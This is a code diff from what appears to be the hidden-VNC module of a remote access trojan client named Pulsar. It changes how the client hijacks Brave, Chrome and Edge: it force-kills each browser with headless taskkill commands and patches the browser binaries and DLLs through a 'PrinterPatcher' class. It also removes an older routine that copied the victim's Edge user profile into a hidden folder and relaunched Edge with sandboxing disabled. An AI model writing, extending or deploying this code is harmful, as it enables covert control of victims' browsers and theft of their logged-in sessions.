@@ -150,7 +150,7 @@ namespace Pulsar.Client.Helper.HVNC
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
                 this.CreateProc(filePath);
 
-                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware");
+                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware", "chrome.dll");
                 patcher.Start();
             }
             catch (Exception ex)
@@ -230,36 +230,21 @@ namespace Pulsar.Client.Helper.HVNC
             try
             {
                 string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
-
                 if (!Directory.Exists(path))
                 {
                     return;
                 }
 
-                string sourceDir = Path.Combine(path, "User Data");
-                if (!Directory.Exists(sourceDir))
-                {
-                    return;
-                }
-
-                string text = Path.Combine(path, "fudasf");
                 string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
+                this.CreateProc(filePath);
 
-                if (!Directory.Exists(text))
-                {
-                    Directory.CreateDirectory(text);
-                    this.CreateProc(filePath);
-                    this.CloneDirectory(sourceDir, text);
-                }
-                else
-                {
-                    DeleteFolder(text);
-                    this.StartEdge();
-                    return;
-                }
+                // Use PROGRAMFILES for the default Edge install location
+                string programFiles = Environment.GetEnvironmentVariable("PROGRAMFILES(X86)");
+                string edgeExe = programFiles + "\\Microsoft\\Edge\\Application\\msedge.exe";
+                string edgeAppDir = programFiles + "\\Microsoft\\Edge\\Application";
 
-                string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"" + text + "\"";
-                this.CreateProc(filePath2);
+                PrinterPatcher patcher = new PrinterPatcher(edgeExe, edgeAppDir, "\\Microsoft\\Edge", "msedge.dll");
+                patcher.Start();
             }
             catch (Exception ex)
             {
@@ -294,7 +279,7 @@ namespace Pulsar.Client.Helper.HVNC
                 //    this.Startchrome();
                 //}
 
-                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application", "\\Google");
+                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application", "\\Google", "chrome.dll");
                 patcher.Start();
             }
             catch (Exception ex)
